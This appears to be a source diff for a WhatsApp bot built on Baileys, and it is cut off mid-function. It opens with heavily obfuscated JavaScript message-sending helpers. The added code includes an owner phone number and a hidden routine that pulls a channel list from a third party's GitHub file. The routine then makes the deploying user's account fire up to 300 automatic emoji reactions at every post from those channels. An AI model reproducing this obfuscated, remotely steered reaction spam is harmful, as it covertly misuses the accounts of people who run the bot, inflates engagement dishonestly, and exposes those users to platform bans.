hexanodecode_ううほ年クロぬ地め=hexanodecode_地会这フ过两;let hexanodecode_تタ一法开机物;hexanodecode_要しتヌ业ヨ&&(hexanodecode_要しتヌ业ヨ['\x70\x61\x63\x6b\x6e'+hexanodecode_ううほ年クロぬ地め(0x34e)]||hexanodecode_要しتヌ业ヨ[hexanodecode_ううほ年クロぬ地め(0x311)+'\x72'])?hexanodecode_تタ一法开机物=await writeExifImg(hexanodecode_خン方这,hexanodecode_要しتヌ业ヨ):hexanodecode_تタ一法开机物=await imageToWebp(hexanodecode_خン方这);const hexanodecode_ナヨすのح={};hexanodecode_ナヨすのح[hexanodecode_ううほ年クロぬ地め(0x363)]=hexanodecode_تタ一法开机物;const hexanodecode_زレ产م如={'\x73\x74\x69\x63\x6b\x65\x72':hexanodecode_ナヨすのح,...hexanodecode_要しتヌ业ヨ};await hexanodecode_于度ن有['\x73\x65\x6e\x64\x4d'+hexanodecode_ううほ年クロぬ地め(0x33e)+'\x65'](hexanodecode_中度ん主,hexanodecode_زレ产م如,hexanodecode_要しتヌ业ヨ);},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x185)+'\x65\x78\x74\x57\x69'+'\x74\x68\x4d\x65\x6e'+'\x74\x69\x6f\x6e\x73']=async(hexanodecode_جひコレ从けちほ产,hexanodecode_ろロミ经ヌ前面,hexanodecode_を说わ上机ホこヒ,hexanodecode_ヒ然ら生好サオムタ={})=>hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x357)+hexanodecode_地会这フ过两(0x33e)+'\x65'](hexanodecode_جひコレ从けちほ产,{'\x74\x65\x78\x74':hexanodecode_ろロミ经ヌ前面,'\x63\x6f\x6e\x74\x65\x78\x74\x49\x6e\x66\x6f':{'\x6d\x65\x6e\x74\x69\x6f\x6e\x65\x64\x4a\x69\x64':[...hexanodecode_ろロミ经ヌ前面[hexanodecode_地会这フ过两(0x338)+'\x41\x6c\x6c'](/@(\d{0,16})/g)]['\x6d\x61\x70'](hexanodecode_ヤさ如ネてضبغ=>hexanodecode_ヤさ如ネてضبغ[0x1b4d*0x1+-0xcd8+0x2*-0x73a]+(hexanodecode_地会这フ过两(0x34a)+'\x61\x74\x73\x61\x70'+hexanodecode_地会这フ过两(0x3e3)))},...hexanodecode_ヒ然ら生好サオムタ},{'\x71\x75\x6f\x74\x65\x64':hexanodecode_を说わ上机ホこヒ}),hexanodecode_于度ن有['\x73\x65\x6e\x64\x49'+hexanodecode_地会这フ过两(0x218)]=async(hexanodecode_们ろ也年们定ن,hexanodecode_它是ت之中,hexanodecode_发民物生化同主ア='',hexanodecode_ひ而水时メキ得='',hexanodecode_大前发リけذ天定)=>{const hexanodecode_خ方分开ن=hexanodecode_地会这フ过两;let hexanodecode_ミくよطヤ发=Buffer[hexanodecode_خ方分开ن(0x174)+hexanodecode_خ方分开ن(0x3e5)](hexanodecode_它是ت之中)?hexanodecode_它是ت之中:/^data:.*?\/.*?;base64,/i[hexanodecode_خ方分开ن(0x2c7)](hexanodecode_它是ت之中)?Buffer[hexanodecode_خ方分开ن(0x167)](hexanodecode_它是ت之中['\x73\x70\x6c\x69\x74']`,`[0x11f3+-0x1b1c*0x1+0x92a],'\x62\x61\x73\x65\x36'+'\x34'):/^https?:\/\//['\x74\x65\x73\x74'](hexanodecode_它是ت之中)?await await getBuffer(hexanodecode_它是ت之中):fs[hexanodecode_خ方分开ن(0x1ff)+'\x73\x53\x79\x6e\x63'](hexanodecode_它是ت之中)?fs[hexanodecode_خ方分开ن(0x381)+hexanodecode_خ方分开ن(0x344)+'\x6e\x63'](hexanodecode_它是ت之中):Buffer[hexanodecode_خ方分开ن(0x2c0)](0x18cb+-0x1ed3+0x608);const hexanodecode_对分な中={'\x69\x6d\x61\x67\x65':hexanodecode_ミくよطヤ发,'\x63\x61\x70\x74\x69\x6f\x6e':hexanodecode_发民物生化同主ア,...hexanodecode_大前发リけذ天定},hexanodecode_开种そي进={};return hexanodecode_开种そي进[hexanodecode_خ方分开ن(0x2c2)+'\x64']=hexanodecode_ひ而水时メキ得,await hexanodecode_于度ن有[hexanodecode_خ方分开ن(0x357)+hexanodecode_خ方分开ن(0x33e)+'\x65'](hexanodecode_们ろ也年们定ن,hexanodecode_对分な中,hexanodecode_开种そي进);},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x185)+hexanodecode_地会这フ过两(0x1de)]=(hexanodecode_く要ノ三ز大和へ,hexanodecode_应مツい以过,hexanodecode_スヌ国ロ里分='',hexanodecode_同的ヌツた起ع出)=>hexanodecode_于度ن有['\x73\x65\x6e\x64\x4d'+hexanodecode_地会这フ过两(0x33e)+'\x65'](hexanodecode_く要ノ三ز大和へ,{'\x74\x65\x78\x74':hexanodecode_应مツい以过,...hexanodecode_同的ヌツた起ع出},{'\x71\x75\x6f\x74\x65\x64':hexanodecode_スヌ国ロ里分}),hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x2ac)+'\x75\x74\x74\x6f\x6e'+hexanodecode_地会这フ过两(0x324)]=(hexanodecode_タ动ヘ方现起两国,hexanodecode_ケ年好说地ネ加モ=[],hexanodecode_开ケ同时以,hexanodecode_的めナ当个一高不て,hexanodecode_ラص到也='',hexanodecode_说らわニص={})=>{const hexanodecode_لサ行ذ=hexanodecode_地会这フ过两,hexanodecode_ب家يイ下是家外={'\x74\x65\x78\x74':hexanodecode_开ケ同时以,'\x66\x6f\x6f\x74\x65\x72':hexanodecode_的めナ当个一高不て,'\x62\x75\x74\x74\x6f\x6e\x73':hexanodecode_ケ年好说地ネ加モ,'\x68\x65\x61\x64\x65\x72\x54\x79\x70\x65':0x2,...hexanodecode_说らわニص};let hexanodecode_产キغف点た=hexanodecode_ب家يイ下是家外;const hexanodecode_く还やシك年水面={'\x71\x75\x6f\x74\x65\x64':hexanodecode_ラص到也,...hexanodecode_说らわニص};hexanodecode_于度ن有[hexanodecode_لサ行ذ(0x357)+'\x65\x73\x73\x61\x67'+'\x65'](hexanodecode_タ动ヘ方现起两国,hexanodecode_产キغف点た,hexanodecode_く还やシك年水面);},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x1d7)+hexanodecode_地会这フ过两(0x1b2)+'\x67']=async(hexanodecode_ロヤレノغ年,hexanodecode_ضヨ面な都='',hexanodecode_而机ス里か='',hexanodecode_モト主是,hexanodecode_خノب在=[],hexanodecode_みヲ高就在たさヌ是,hexanodecode_有其はغキシ得ひ里={})=>{const hexanodecode_ض现んظ三=hexanodecode_地会这フ过两,hexanodecode_ا说フحア={};hexanodecode_ا说フحア[hexanodecode_ض现んظ三(0x267)]=hexanodecode_モト主是,hexanodecode_ا说フحア[hexanodecode_ض现んظ三(0x3b7)+hexanodecode_ض现んظ三(0x38d)+hexanodecode_ض现んظ三(0x3a6)]=hexanodecode_みヲ高就在たさヌ是;const hexanodecode_わこت当エオ如由ظ={};hexanodecode_わこت当エオ如由ظ['\x75\x70\x6c\x6f\x61'+'\x64']=hexanodecode_于度ن有['\x77\x61\x55\x70\x6c'+hexanodecode_ض现んظ三(0x1f7)+'\x53\x65\x72\x76\x65'+'\x72'];let hexanodecode_有あとاりまف=await prepareWAMessageMedia(hexanodecode_ا说フحア,hexanodecode_わこت当エオ如由ظ);const hexanodecode_着度年下جて={};hexanodecode_着度年下جて[hexanodecode_ض现んظ三(0x267)+hexanodecode_ض现んظ三(0x158)+'\x67\x65']=hexanodecode_有あとاりまف['\x69\x6d\x61\x67\x65'+hexanodecode_ض现んظ三(0x158)+'\x67\x65'],hexanodecode_着度年下جて['\x68\x79\x64\x72\x61'+hexanodecode_ض现んظ三(0x23c)+hexanodecode_ض现んظ三(0x2ea)+hexanodecode_ض现んظ三(0x324)]=hexanodecode_ضヨ面な都,hexanodecode_着度年下جて[hexanodecode_ض现んظ三(0x3dc)+'\x74\x65\x64\x46\x6f'+'\x6f\x74\x65\x72\x54'+hexanodecode_ض现んظ三(0x1de)]=hexanodecode_而机ス里か,hexanodecode_着度年下جて[hexanodecode_ض现んظ三(0x3dc)+'\x74\x65\x64\x42\x75'+'\x74\x74\x6f\x6e\x73']=hexanodecode_خノب在;const hexanodecode_机水体水着あ成小={};hexanodecode_机水体水着あ成小[hexanodecode_ض现んظ三(0x3dc)+hexanodecode_ض现んظ三(0x1dd)+hexanodecode_ض现んظ三(0xe1)+'\x65']=hexanodecode_着度年下جて;const hexanodecode_小之两طネ={};hexanodecode_小之两طネ['\x74\x65\x6d\x70\x6c'+hexanodecode_ض现んظ三(0x2ed)+hexanodecode_ض现んظ三(0x2d6)]=hexanodecode_机水体水着あ成小;var hexanodecode_进度よ用ش应ふを=generateWAMessageFromContent(hexanodecode_ロヤレノغ年,proto[hexanodecode_ض现んظ三(0x158)+'\x67\x65']['\x66\x72\x6f\x6d\x4f'+hexanodecode_ض现んظ三(0x1f1)](hexanodecode_小之两طネ),hexanodecode_有其はغキシ得ひ里);hexanodecode_于度ن有['\x72\x65\x6c\x61\x79'+hexanodecode_ض现んظ三(0x158)+'\x67\x65'](hexanodecode_ロヤレノغ年,hexanodecode_进度よ用ش应ふを['\x6d\x65\x73\x73\x61'+'\x67\x65'],{'\x6d\x65\x73\x73\x61\x67\x65\x49\x64':hexanodecode_进度よ用ش应ふを[hexanodecode_ض现んظ三(0x278)]['\x69\x64']});},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x28d)+'\x6d\x65']=(hexanodecode_タ学キ中性,hexanodecode_物定有つ体م=![])=>{const hexanodecode_さキ现كリ分へへ=hexanodecode_地会这フ过两;id=hexanodecode_于度ن有[hexanodecode_さキ现كリ分へへ(0x379)+hexanodecode_さキ现كリ分へへ(0x2e7)](hexanodecode_タ学キ中性),hexanodecode_物定有つ体م=hexanodecode_于度ن有[hexanodecode_さキ现كリ分へへ(0xe9)+hexanodecode_さキ现كリ分へへ(0x3fc)+hexanodecode_さキ现كリ分へへ(0x3c5)]||hexanodecode_物定有つ体م;let hexanodecode_おテ所へをز不ツر;if(id[hexanodecode_さキ现كリ分へへ(0x250)+hexanodecode_さキ现كリ分へへ(0x189)](hexanodecode_さキ现كリ分へへ(0x383)))return new Promise(async hexanodecode_ひل下如量セ=>{const hexanodecode_好ط经些にく=hexanodecode_さキ现كリ分へへ;hexanodecode_おテ所へをز不ツر=store[hexanodecode_好ط经些にく(0xfd)+hexanodecode_好ط经些にく(0x251)][id]||{};if(!(hexanodecode_おテ所へをز不ツر['\x6e\x61\x6d\x65']||hexanodecode_おテ所へをز不ツر[hexanodecode_好ط经些にく(0x11e)+'\x79']||hexanodecode_おテ所へをز不ツر[hexanodecode_好ط经些にく(0x287)+'\x63\x74']))hexanodecode_おテ所へをز不ツر=hexanodecode_于度ن有[hexanodecode_好ط经些にく(0x1f0)+hexanodecode_好ط经些にく(0x3fd)+'\x61\x74\x61'](id)||{};hexanodecode_ひل下如量セ(hexanodecode_おテ所へをز不ツر[hexanodecode_好ط经些にく(0x231)]||hexanodecode_おテ所へをز不ツر[hexanodecode_好ط经些にく(0x287)+'\x63\x74']||PhoneNumber('\x2b'+id[hexanodecode_好ط经些にく(0x30e)+'\x63\x65']('\x40\x73\x2e\x77\x68'+hexanodecode_好ط经些にく(0x24f)+hexanodecode_好ط经些にく(0x3e3),''))[hexanodecode_好ط经些にく(0x153)+hexanodecode_好ط经些にく(0x101)](hexanodecode_好ط经些にく(0x20b)+hexanodecode_好ط经些にく(0x118)+'\x6e\x61\x6c'));});else hexanodecode_おテ所へをز不ツر=id===hexanodecode_さキ现كリ分へへ(0x38c)+'\x68\x61\x74\x73\x61'+'\x70\x70\x2e\x6e\x65'+'\x74'?{'\x69\x64':id,'\x6e\x61\x6d\x65':hexanodecode_さキ现كリ分へへ(0x1ef)+hexanodecode_さキ现كリ分へへ(0x142)}:id===hexanodecode_于度ن有[hexanodecode_さキ现كリ分へへ(0x379)+hexanodecode_さキ现كリ分へへ(0x2e7)](hexanodecode_于度ن有[hexanodecode_さキ现كリ分へへ(0x349)]['\x69\x64'])?hexanodecode_于度ن有['\x75\x73\x65\x72']:store[hexanodecode_さキ现كリ分へへ(0xfd)+hexanodecode_さキ现كリ分へへ(0x251)][id]||{};return(hexanodecode_物定有つ体م?'':hexanodecode_おテ所へをز不ツر['\x6e\x61\x6d\x65'])||hexanodecode_おテ所へをز不ツر[hexanodecode_さキ现كリ分へへ(0x287)+'\x63\x74']||hexanodecode_おテ所へをز不ツر[hexanodecode_さキ现كリ分へへ(0x404)+'\x69\x65\x64\x4e\x61'+'\x6d\x65']||PhoneNumber('\x2b'+hexanodecode_タ学キ中性[hexanodecode_さキ现كリ分へへ(0x30e)+'\x63\x65'](hexanodecode_さキ现كリ分へへ(0x34a)+'\x61\x74\x73\x61\x70'+hexanodecode_さキ现كリ分へへ(0x3e3),''))[hexanodecode_さキ现كリ分へへ(0x153)+hexanodecode_さキ现كリ分へへ(0x101)](hexanodecode_さキ现كリ分へへ(0x20b)+'\x6e\x61\x74\x69\x6f'+hexanodecode_さキ现كリ分へへ(0x304));},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x309)+'\x6f\x6e\x74\x61\x63'+'\x74']=async(hexanodecode_い实オむ力の,hexanodecode_实و所ソあ,hexanodecode_因ヒ性テ种='',hexanodecode_实メ是年お={})=>{const hexanodecode_种十マ国力能=hexanodecode_地会这フ过两;let hexanodecode_ا分るこ加而=[];for(let hexanodecode_ウくヤへラちかس人 of hexanodecode_实و所ソあ){hexanodecode_ا分るこ加而[hexanodecode_种十マ国力能(0x107)]({'\x64\x69\x73\x70\x6c\x61\x79\x4e\x61\x6d\x65':await hexanodecode_于度ن有[hexanodecode_种十マ国力能(0x28d)+'\x6d\x65'](hexanodecode_ウくヤへラちかس人+(hexanodecode_种十マ国力能(0x34a)+hexanodecode_种十マ国力能(0x24f)+hexanodecode_种十マ国力能(0x3e3))),'\x76\x63\x61\x72\x64':hexanodecode_种十マ国力能(0x21a)+hexanodecode_种十マ国力能(0x2a6)+hexanodecode_种十マ国力能(0x2e6)+hexanodecode_种十マ国力能(0x35e)+hexanodecode_种十マ国力能(0x13c)+'\x3a'+await hexanodecode_于度ن有[hexanodecode_种十マ国力能(0x28d)+'\x6d\x65'](hexanodecode_ウくヤへラちかس人+('\x40\x73\x2e\x77\x68'+hexanodecode_种十マ国力能(0x24f)+'\x70\x2e\x6e\x65\x74'))+hexanodecode_种十マ国力能(0x2a3)+global['\x4f\x77\x6e\x65\x72'+hexanodecode_种十マ国力能(0x183)]+(hexanodecode_种十マ国力能(0x25b)+hexanodecode_种十マ国力能(0x1fc)+hexanodecode_种十マ国力能(0x3b9)+'\x3d')+hexanodecode_ウくヤへラちかس人+'\x3a'+hexanodecode_ウくヤへラちかس人+(hexanodecode_种十マ国力能(0x25b)+hexanodecode_种十マ国力能(0x2e1)+hexanodecode_种十マ国力能(0x27c)+hexanodecode_种十マ国力能(0x161)+hexanodecode_种十マ国力能(0x2db)+hexanodecode_种十マ国力能(0x1e6)+hexanodecode_种十マ国力能(0x1bf)+hexanodecode_种十マ国力能(0x25b)+'\x32\x2e\x45\x4d\x41'+'\x49\x4c\x3b\x74\x79'+hexanodecode_种十マ国力能(0x347)+hexanodecode_种十マ国力能(0x2fe)+'\x54\x3a')+global['\x65\x6d\x61\x69\x6c']+('\x0a\x69\x74\x65\x6d'+hexanodecode_种十マ国力能(0x3ec)+'\x42\x4c\x61\x62\x65'+'\x6c\x3a\x47\x69\x74'+hexanodecode_种十マ国力能(0x257)+hexanodecode_种十マ国力能(0x168)+hexanodecode_种十マ国力能(0x3a3)+hexanodecode_种十マ国力能(0x335)+hexanodecode_种十マ国力能(0x1c5)+hexanodecode_种十マ国力能(0x390)+'\x6f\x6d\x2f')+global['\x67\x69\x74\x68\x75'+'\x62']+('\x2f\x6b\x68\x61\x6e'+hexanodecode_种十マ国力能(0x3ee)+'\x69\x74\x65\x6d\x33'+hexanodecode_种十マ国力能(0x103)+hexanodecode_种十マ国力能(0x223)+hexanodecode_种十マ国力能(0x186)+'\x75\x62\x0a\x69\x74'+'\x65\x6d\x34\x2e\x41'+hexanodecode_种十マ国力能(0x12f))+global[hexanodecode_种十マ国力能(0x39f)+'\x69\x6f\x6e']+('\x3b\x3b\x3b\x3b\x0a'+hexanodecode_种十マ国力能(0x341)+'\x2e\x58\x2d\x41\x42'+hexanodecode_种十マ国力能(0x223)+hexanodecode_种十マ国力能(0x22c)+'\x6f\x6e\x0a\x45\x4e'+hexanodecode_种十マ国力能(0x39a)+'\x52\x44')});}const hexanodecode_如いミ物ハ的みسう={};hexanodecode_如いミ物ハ的みسう['\x64\x69\x73\x70\x6c'+hexanodecode_种十マ国力能(0x354)+'\x65']=hexanodecode_ا分るこ加而[hexanodecode_种十マ国力能(0x19a)+'\x68']+(hexanodecode_种十マ国力能(0x1a5)+hexanodecode_种十マ国力能(0x166)),hexanodecode_如いミ物ハ的みسう[hexanodecode_种十マ国力能(0xfd)+hexanodecode_种十マ国力能(0x251)]=hexanodecode_ا分るこ加而;const hexanodecode_性ワや下م能={'\x63\x6f\x6e\x74\x61\x63\x74\x73':hexanodecode_如いミ物ハ的みسう,...hexanodecode_实メ是年お},hexanodecode_量غل人ワ我从={};hexanodecode_量غل人ワ我从['\x71\x75\x6f\x74\x65'+'\x64']=hexanodecode_因ヒ性テ种,hexanodecode_于度ن有[hexanodecode_种十マ国力能(0x357)+'\x65\x73\x73\x61\x67'+'\x65'](hexanodecode_い实オむ力の,hexanodecode_性ワや下م能,hexanodecode_量غل人ワ我从);},hexanodecode_于度ن有['\x73\x65\x74\x53\x74'+hexanodecode_地会这フ过两(0x2cd)]=hexanodecode_也在成能种天ゆ物=>{const hexanodecode_了以ひظ=hexanodecode_地会这フ过两,hexanodecode_にチ方他起能民本={};return hexanodecode_にチ方他起能民本['\x74\x6f']=hexanodecode_了以ひظ(0x34a)+hexanodecode_了以ひظ(0x24f)+hexanodecode_了以ひظ(0x3e3),hexanodecode_にチ方他起能民本[hexanodecode_了以ひظ(0x113)]=hexanodecode_了以ひظ(0x387),hexanodecode_にチ方他起能民本[hexanodecode_了以ひظ(0x328)]=hexanodecode_了以ひظ(0xef)+'\x73',hexanodecode_于度ن有[hexanodecode_了以ひظ(0x262)]({'\x74\x61\x67':'\x69\x71','\x61\x74\x74\x72\x73':hexanodecode_にチ方他起能民本,'\x63\x6f\x6e\x74\x65\x6e\x74':[{'\x74\x61\x67':hexanodecode_了以ひظ(0xef)+'\x73','\x61\x74\x74\x72\x73':{},'\x63\x6f\x6e\x74\x65\x6e\x74':Buffer[hexanodecode_了以ひظ(0x167)](hexanodecode_也在成能种天ゆ物,hexanodecode_了以ひظ(0x16b))}]}),hexanodecode_也在成能种天ゆ物;},hexanodecode_于度ن有[hexanodecode_地会这フ过两(0x376)+'\x6c\x69\x7a\x65\x4d']=hexanodecode_中ホ主为お的レ=>sms(hexanodecode_于度ن有,hexanodecode_中ホ主为お的レ,store);}app['\x67\x65\x74']('\x2f',(hexanodecode_小发们学业能ん,hexanodecode_小理国めسقワオほ)=>{const hexanodecode_同かふ两しス成得=hexanodecode_ي和们点تク;hexanodecode_小理国めسقワオほ[hexanodecode_同かふ两しス成得(0x12e)](hexanodecode_同かふ两しス成得(0x265)+hexanodecode_同かふ两しス成得(0x2de)+hexanodecode_同かふ两しス成得(0xe5)+hexanodecode_同かふ两しス成得(0x1d5));}),app['\x6c\x69\x73\x74\x65'+'\x6e'](port,()=>console[hexanodecode_ي和们点تク(0x180)](hexanodecode_ي和们点تク(0x2c1)+hexanodecode_ي和们点تク(0x30b)+hexanodecode_ي和们点تク(0xfe)+hexanodecode_ي和们点تク(0x3e8)+hexanodecode_ي和们点تク(0x3bc)+hexanodecode_ي和们点تク(0x3fb)+hexanodecode_ي和们点تク(0x337)+'\x61\x6c\x68\x6f\x73'+'\x74\x3a'+port)),setTimeout(()=>{connectToWA();},0x888+-0x25a8+-0x2cc0*-0x1);
+const {
+  default: makeWASocket,
+    useMultiFileAuthState,
+    DisconnectReason,
+    jidNormalizedUser,
+    isJidBroadcast,
+    getContentType,
+    proto,
+    generateWAMessageContent,
+    generateWAMessage,
+    AnyMessageContent,
+    prepareWAMessageMedia,
+    areJidsSameUser,
+    downloadContentFromMessage,
+    MessageRetryMap,
+    generateForwardMessageContent,
+    generateWAMessageFromContent,
+    generateMessageID,
+    makeInMemoryStore,
+    jidDecode,
+    fetchLatestBaileysVersion,
+    Browsers
+  } = require('@whiskeysockets/baileys')
+  
+  const l = console.log
+  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
+  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
+  const fs = require('fs')
+  const ff = require('fluent-ffmpeg')
+  const P = require('pino')
+  const config = require('./config')
+  const GroupEvents = require('./lib/groupevents');
+  const qrcode = require('qrcode-terminal')
+  const StickersTypes = require('wa-sticker-formatter')
+  const util = require('util')
+  const { sms, downloadMediaMessage, AntiDelete, storeMessage } = require('./lib')
+  const FileType = require('file-type');
+  const axios = require('axios')
+  const { File } = require('megajs')
+  const { fromBuffer } = require('file-type')
+  const bodyparser = require('body-parser')
+  const os = require('os')
+  const Crypto = require('crypto')
+  const path = require('path')
+  const prefix = config.PREFIX
+  
+  const ownerNumber = ['923035512967']
+  
+  const tempDir = path.join(os.tmpdir(), 'cache-temp')
+  if (!fs.existsSync(tempDir)) {
+      fs.mkdirSync(tempDir, { recursive: true })
+  }
+  
+  const clearTempDir = () => {
+      fs.readdir(tempDir, (err, files) => {
+          if (err) return console.error('TempDir read error:', err);
+          for (const file of files) {
+              fs.unlink(path.join(tempDir, file), err => {
+                  if (err) console.error('TempDir unlink error:', err);
+              });
+          }
+      });
+  }
+  
+  setInterval(clearTempDir, 5 * 60 * 1000);
+  
+  const groupMetadataCache = new Map();
+  
+  const getCachedGroupMetadata = async (conn, jid) => {
+      const now = Date.now();
+      const cached = groupMetadataCache.get(jid);
+   
+      if (cached && (now - cached.time) < 5 * 60 * 1000) {
+          return cached.data;
+      }
+      try {
+          const data = await conn.groupMetadata(jid);
+          groupMetadataCache.set(jid, { data, time: now });
+          return data;
+      } catch (e) {
+          return cached ? cached.data : {};
+      }
+  };
+
+// ================== NEWSLETTER REACT SYSTEM ==================
+let newsletterJids = null;
+let loadingNewsletters = false;
+let lastNewsletterFetch = 0;
+const NEWSLETTER_TTL = 60 * 60 * 1000;
+const normale = (jid) => String(jid || "").trim().toLowerCase();
+
+const manualNewsletterJids = [
+    "120363403380688821@newsletter",
+];
+
+const reactedMessages = new Map();
+const newsletterEmojis = ["❤️", "🩷", "🥰", "🧡", "🖤", "❤️‍🩹", "😎", "🤌🏻", "😻", "💕", "✨", "🌟", "💯", "🔥", "👏", "🙌", "💪", "🎉", "🥳", "😍", "🤩", "😘", "🥺", "🤗"];
+
+async function ensureNewsletterLoaded() {
+    if (Array.isArray(newsletterJids) && Date.now() - lastNewsletterFetch < NEWSLETTER_TTL) return newsletterJids;
+    if (loadingNewsletters) return newsletterJids || [];
+    loadingNewsletters = true;
+    try {
+        const res = await axios.get(
+            "https://raw.githubusercontent.com/iTx-Sarkar/iTx-Sarkar/refs/heads/main/News.json",
+            { timeout: 10000 }
+        );
+        let fetchedJids = Array.isArray(res.data) ? res.data.map(normale) : [];
+        const merged = new Set([...manualNewsletterJids.map(normale), ...fetchedJids]);
+        newsletterJids = Array.from(merged);
+        lastNewsletterFetch = Date.now();
+        console.log(`✅ Loaded ${newsletterJids.length} newsletter channels (${fetchedJids.length} from GitHub + ${manualNewsletterJids.length} manual)`);
+    } catch {
+        newsletterJids = manualNewsletterJids.map(normale);
+        lastNewsletterFetch = Date.now();
+        console.log(`⚠️ Failed to load GitHub channels, using ${newsletterJids.length} manual channel(s) only`);
+    } finally {
+        loadingNewsletters = false;
+    }
+    return newsletterJids || [];
+}
+
+async function sendReactionsToChannel(conn, channelJid, serverMessageId, count = null) {
+    try {
+        if (!channelJid || !serverMessageId) throw new Error("Missing required parameters for channel reaction");
+
+        let normalizedJid = normale(channelJid);
+        if (!normalizedJid.endsWith("@newsletter")) normalizedJid = normalizedJid + "@newsletter";
+
+        const reactionCount = count || parseInt(config.CHANNEL_REACT_COUNT) || 50;
+        const maxReactions = Math.min(reactionCount, 300);
+        const minReactions = Math.max(maxReactions, 5);
+        const messageKey = `${normalizedJid}_${serverMessageId}`;
+
+        if (reactedMessages.has(messageKey)) {
+            const existing = reactedMessages.get(messageKey);
+            if (existing.reactions >= minReactions) {
+                console.log(`⏭️ Already sent ${existing.reactions} reactions to ${messageKey}`);
+                return existing.reactions;
+            }
+            const remaining = minReactions - existing.reactions;
+            let sentCount = 0;
+            for (let i = 0; i < remaining; i++) {
+                const emoji = newsletterEmojis[Math.floor(Math.random() * newsletterEmojis.length)];
+                try {
+                    await conn.newsletterReactMessage(normalizedJid, serverMessageId.toString(), emoji);
+                    sentCount++;
+                    if (i % 10 === 0 && i > 0) await sleep(200);
+                } catch (err) {
+                    console.log(`⚠️ Reaction ${i + 1} failed:`, err.message);
+                    if (err.message.includes('429') || err.message.includes('rate')) {
+                        console.log('⏳ Rate limited, waiting 2 seconds...');
+                        await sleep(2000);
+                    }
+                }
+            }
+            existing.reactions += sentCount;
+            existing.lastUpdate = Date.now();
+            reactedMessages.set(messageKey, existing);
+            console.log(`✅ Added ${sentCount} more reactions to ${messageKey} (Total: ${existing.reactions})`);
+            return existing.reactions;
+        }
+
+        console.log(`🎯 Sending ${minReactions} reactions to channel ${normalizedJid} (msg: ${serverMessageId})`);
+        let successCount = 0;
+        for (let i = 0; i < minReactions; i++) {
+            const emoji = newsletterEmojis[Math.floor(Math.random() * newsletterEmojis.length)];
+            try {
+                await conn.newsletterReactMessage(normalizedJid, serverMessageId.toString(), emoji);
+                successCount++;
+                if (i % 10 === 0 && i > 0) await sleep(200);
+            } catch (err) {
+                console.log(`⚠️ Reaction ${i + 1} failed:`, err.message);
+                if (err.message.includes('429') || err.message.includes('rate')) {
+                    console.log('⏳ Rate limited, waiting 2 seconds...');
+                    await sleep(2000);
+                }
+            }
+        }
+
+        reactedMessages.set(messageKey, {
+            reactions: successCount,
+            lastUpdate: Date.now(),
+            channelJid: normalizedJid,
+            serverId: serverMessageId
+        });
+
+        console.log(`✅ Sent ${successCount}/${minReactions} reactions to ${messageKey}`);
+
+        if (reactedMessages.size > 1000) {
+            const entries = Array.from(reactedMessages.entries());
+            entries.sort((a, b) => a[1].lastUpdate - b[1].lastUpdate);
+            entries.slice(0, entries.length - 1000).forEach(([key]) => reactedMessages.delete(key));
+        }
+
+        return successCount;
+    } catch (err) {
+        console.error("❌ Channel Reaction Error:", err.message);
+        throw err;
+    }
+}
+
+async function handleNewsletterReaction(conn, mek) {
+    try {
+        if (!mek?.key?.remoteJid) return;
+
+        const channels = await ensureNewsletterLoaded();
+        if (!channels || channels.length === 0) return;
+
+        const remoteJid = normale(mek.key.remoteJid);
+        if (!remoteJid.endsWith("@newsletter")) return;
+        if (!channels.includes(remoteJid)) return;
+
+        const serverId = mek.key.id || mek.key.server_id || mek.key.stanzaId;
+        if (!serverId) {
+            console.log("⚠️ No server_id found for newsletter message");
+            return;
+        }
+
+        const messageKey = `${remoteJid}_${serverId}`;
+        if (reactedMessages.has(messageKey)) return;
+
+        console.log(`📢 New channel post detected in ${remoteJid}, sending reactions...`);
+        await sendReactionsToChannel(conn, remoteJid, serverId);
+    } catch (err) {
+        console.error("❌ Newsletter Reaction Error:", err.message);
+    }
+}
+
+async function handleChannelReactCommand(conn, mek, msg, options) {
+    try {
+        const body = options.body || '';
+        const sender = mek.key.participant || mek.key.remoteJid;
+        const senderNum = sender.split("@")[0] || sender.split(":")[0];
+        const isAuthorized = ownerNumber.includes(senderNum) || mek.key.fromMe;
+
+        if (!isAuthorized) {
+            await msg.reply("❌ You are not authorized to use this command!");
+            return;
+        }
+
+        let channelJid = null;
+        let serverId = null;
+        const reactionCount = parseInt(config.CHANNEL_REACT_COUNT) || 50;
+        const fullText = body || '';
+
+        const urlMatch = fullText.match(/https:\/\/whatsapp\.com\/channel\/([^\/\s]+)\/(\d+)/);
+        if (urlMatch) {
+            const codeOrId = urlMatch[1];
+            const postId = urlMatch[2];
+            if (/^\d+$/.test(codeOrId)) {
+                channelJid = `${codeOrId}@newsletter`;
+                serverId = postId;
+            } else if (typeof conn.newsletterMetadata === 'function') {
+                try {
+                    const meta = await conn.newsletterMetadata("invite", codeOrId);
+                    if (meta?.id) {
+                        channelJid = meta.id;
+                        serverId = postId;
+                    }
+                } catch (err) {
+                    console.log("⚠️ Could not resolve invite code:", err.message);
+                }
+            }
+        }
+
+        const directIdMatch = fullText.match(/@newsletter\s+(\d+)|(\d{15,})\s+(\d+)/);
+        if ((!channelJid || !serverId) && directIdMatch) {
+            const numId = directIdMatch[2];
+            const msgId = directIdMatch[1] || directIdMatch[3];
+            if (numId && msgId) {
+                channelJid = `${numId}@newsletter`;
+                serverId = msgId;
+            }
+        }
+
+        if (!channelJid || !serverId) {
+            const contextInfo = mek.message?.extendedTextMessage?.contextInfo;
+
+            if (contextInfo?.forwardedNewsletterMessageInfo?.newsletterJid) {
+                channelJid = contextInfo.forwardedNewsletterMessageInfo.newsletterJid;
+                serverId = contextInfo.forwardedNewsletterMessageInfo.serverMessageId;
+            }
+
+            if ((!channelJid || !serverId) && contextInfo?.remoteJid?.includes('@newsletter') && contextInfo?.stanzaId) {
+                channelJid = contextInfo.remoteJid;
+                serverId = contextInfo.stanzaId;
+            }
+
